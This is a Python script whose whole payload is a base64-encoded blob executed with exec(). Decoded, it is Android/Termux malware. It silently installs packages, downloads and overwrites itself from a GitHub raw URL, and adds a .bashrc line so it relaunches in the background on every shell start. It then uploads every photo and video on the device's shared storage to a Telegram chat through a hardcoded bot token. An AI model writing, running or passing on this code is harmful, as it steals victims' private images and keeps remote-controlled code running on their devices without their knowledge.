import base64

b64 = "aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzaHV0aWwKCnRyeToKICAgIGltcG9ydCB0ZWxlYm90CmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgdGVsZWJvdCA+IC9kZXYvbnVsbCAyPiYxJykKCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzID4gL2Rldi9udWxsIDI+JjEnKQoKR0lUSFVCX1JBVyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vemVyb3M5OTkvSEFDSy1DQU1FUkEyMDI1L21haW4vY2FtZXJhLWhhY2sucHkiCkxPQ0FMX0ZJTEUgPSAiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3VzciIKCnRyeToKICAgIHIgPSByZXF1ZXN0cy5nZXQoR0lUSFVCX1JBVywgdGltZW91dD01KQogICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgcmVtb3RlID0gci50ZXh0CiAgICAgICAgbG9jYWwgPSAiIgoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhMT0NBTF9GSUxFKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKExPQ0FMX0ZJTEUsICJyIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBsb2NhbCA9IGYucmVhZCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgaWYgcmVtb3RlICE9IGxvY2FsOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oTE9DQUxfRklMRSwgInciKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUocmVtb3RlKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCmV4Y2VwdDoKICAgIHBhc3MKCiMgICAgU09OVQoKYmFzaHJjX3BhdGggPSAiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL2hvbWUvLmJhc2hyYyIKCmtvZCA9ICIiIgppZiBbIC1mIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3Ivc3RhcnQucHkgXTsgdGhlbgogICAgKAogICAgICAgIGNkIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IgPiAvZGV2L251bGwgMj4mMQogICAgICAgIHB5dGhvbiBzdGFydC5weSA+IC9kZXYvbnVsbCAyPiYxICYKICAgICkKZmkKIiIiLnN0cmlwKCkKCgppZiBub3Qgb3MucGF0aC5leGlzdHMoYmFzaHJjX3BhdGgpOgogICAgd2l0aCBvcGVuKGJhc2hyY19wYXRoLCAidyIpIGFzIGY6CiAgICAgICAgcGFzcwoKd2l0aCBvcGVuKGJhc2hyY19wYXRoLCAiciIpIGFzIGY6CiAgICBjb250ZW50ID0gZi5yZWFkKCkKCgppZiBrb2QgaW4gY29udGVudDoKICAgIHBhc3MKICAgICNwcmludCgiQXJ0xLFxIH4vLmJhc2hyYyBpw6dpbmTJmSB2YXIuIikKZWxzZToKCiAgICB3aXRoIG9wZW4oYmFzaHJjX3BhdGgsICJhIikgYXMgZjoKICAgICAgICBmLndyaXRlKCJcbiIgKyBrb2QgKyAiXG4iKQoKCmN1cnJlbnRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykKdGFyZ2V0X3BhdGggPSAiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9zdGFydC5weSIKCmlmIGN1cnJlbnRfcGF0aCAhPSB0YXJnZXRfcGF0aDoKICAgIHRyeToKICAgICAgICBzaHV0aWwubW92ZShjdXJyZW50X3BhdGgsIHRhcmdldF9wYXRoKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCiNvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHRlbGVib3QgPiAvZGV2L251bGwgMj4mMScpCgpBUElfVE9LRU4gPSAiODUwNTc5MjgxNTpBQUVDRXdFdjNMQUwxQmtkc0VqbExZRkFESWJOZDBIdzhPayIKVEFSR0VUX0lEID0gMTUwNTk4Mzk2MApib3QgPSB0ZWxlYm90LlRlbGVCb3QoQVBJX1RPS0VOKQoKc2VudF9maWxlID0gIi9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3Ivc2VuZC50eHQiCgppZiBub3Qgb3MucGF0aC5leGlzdHMoc2VudF9maWxlKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oc2VudF9maWxlLCAidyIpIGFzIGY6CiAgICAgICAgICAgIHBhc3MKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpzZW50X3RpbWVzID0gc2V0KCkKdHJ5OgogICAgd2l0aCBvcGVuKHNlbnRfZmlsZSwgInIiKSBhcyBmOgogICAgICAgIGZvciBsaW5lIGluIGY6CiAgICAgICAgICAgIGxpbmUgPSBsaW5lLnN0cmlwKCkKICAgICAgICAgICAgaWYgbGluZToKICAgICAgICAgICAgICAgIHNlbnRfdGltZXMuYWRkKGZsb2F0KGxpbmUpKQpleGNlcHQ6CiAgICBwYXNzCmltYWdlX2V4dCA9IFsiLmpwZyIsICIuanBlZyIsICIucG5nIiwgIi53ZWJwIl0KdmlkZW9fZXh0ID0gWyIubXA0Il0KCnJvb3QgPSAiL3N0b3JhZ2UvZW11bGF0ZWQvMCIKZmlsZXNfdG9fc2VuZCA9IFtdCgpmb3IgZm9sZGVyLCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHJvb3QpOgogICAgZm9yIGYgaW4gZmlsZXM6CiAgICAgICAgbmFtZSA9IGYubG93ZXIoKQogICAgICAgIGZ1bGxfcGF0aCA9IG9zLnBhdGguam9pbihmb2xkZXIsIGYpCgogICAKICAgICAgICBpZiBhbnkobmFtZS5lbmRzd2l0aChleHQpIGZvciBleHQgaW4gaW1hZ2VfZXh0ICsgdmlkZW9fZXh0KToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbXRpbWUgPSBvcy5wYXRoLmdldG10aW1lKGZ1bGxfcGF0aCkKCiAgICAgICAgICAgICAgICBpZiBtdGltZSBpbiBzZW50X3RpbWVzOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgZmlsZXNfdG9fc2VuZC5hcHBlbmQoKGZ1bGxfcGF0aCwgbXRpbWUpKQoKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwoKCmZpbGVzX3RvX3NlbmQuc29ydChrZXk9bGFtYmRhIHg6IHhbMV0sIHJldmVyc2U9VHJ1ZSkKCmZvciBwYXRoLCBtdGltZSBpbiBmaWxlc190b19zZW5kOgogICAgdHJ5OgogICAgICAgIGNhcHRpb24gPSB0aW1lLnN0cmZ0aW1lKCclWS0lbS0lZCAlSDolTTolUycsIHRpbWUubG9jYWx0aW1lKG10aW1lKSkKICAgICAgICBsb3cgPSBwYXRoLmxvd2VyKCkKICAgICAgICBpZiBhbnkobG93LmVuZHN3aXRoKGV4dCkgZm9yIGV4dCBpbiBpbWFnZV9leHQpOgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInJiIikgYXMgcDoKICAgICAgICAgICAgICAgIGJvdC5zZW5kX3Bob3RvKFRBUkdFVF9JRCwgcCwgY2FwdGlvbj1jYXB0aW9uKQogICAgICAgIGVsaWYgYW55KGxvdy5lbmRzd2l0aChleHQpIGZvciBleHQgaW4gdmlkZW9fZXh0KToKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyYiIpIGFzIHY6CiAgICAgICAgICAgICAgICBib3Quc2VuZF92aWRlbyhUQVJHRVRfSUQsIHYsIGNhcHRpb249Y2FwdGlvbikKCiAgICAgICAgIyBUYXJpeGkgcWV5ZCBldCAoeWVuaWTJmW4gZ8O2bmTJmXJpbG3JmXNpbikKICAgICAgICB3aXRoIG9wZW4oc2VudF9maWxlLCAiYSIpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoc3RyKG10aW1lKSArICJcbiIpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3M="
exec(base64.b64decode(b64).decode())